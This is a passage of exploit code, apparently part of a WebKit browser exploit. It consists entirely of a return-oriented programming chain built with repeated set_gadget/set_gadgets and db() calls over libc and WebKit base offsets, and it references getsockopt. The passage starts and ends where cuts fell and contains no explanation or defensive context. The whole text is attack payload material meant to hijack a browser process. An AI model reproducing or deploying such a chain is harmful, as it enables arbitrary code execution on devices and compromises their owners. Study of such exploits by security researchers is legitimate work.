ropchain+174160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+174304, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+174296, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+174320, 
ropchain+174768, 
libc_base+50775, 
libc_base+793877, 
ropchain+174376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+174544, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+174576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+174560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+174528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+174648, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+174664, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+174760, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+174744, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+174808, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+174912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+174928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+175080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+175096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+175064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+175184, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175200, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+175320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175336, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+175304, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+175432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175448, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+175560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175544, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+175648, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+175632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+175744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175760, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+175872, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+175856, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+177200, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+177272, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+177336, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([4, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+177464, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+177584, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([61, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+177768, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+177872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+177888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+178040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+178072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+178056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+178024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+178168, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+178152, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+178272, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+180264, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+178408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+178424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+178392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+178528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+178576, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+178544, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+178688, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+178680, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+178704, 
ropchain+179152, 
libc_base+50775, 
libc_base+793877, 
ropchain+178760, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+178928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+178960, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+178944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+178912, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+179032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+179144, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+179128, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+179192, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+179296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+179312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+179464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+179480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+179448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+179568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179584, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+179704, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179720, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+179688, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+179816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179832, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+179944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+179928, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+180032, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+180016, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+180128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+180144, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+180256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+180240, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+181584, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+181656, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+181720, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([4, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+181848, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+181968, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([61, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+182152, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+182256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+182272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+182424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+182456, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+182440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+182408, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+182552, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+182536, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+182656, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+184648, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+182792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+182808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+182776, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+182912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+182960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+182928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+183072, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+183064, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+183088, 
ropchain+183536, 
libc_base+50775, 
libc_base+793877, 
ropchain+183144, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+183312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+183344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+183328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+183296, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+183416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+183432, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+183528, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+183512, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+183576, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+183680, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+183696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+183848, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+183880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+183864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+183832, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+183952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+183968, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
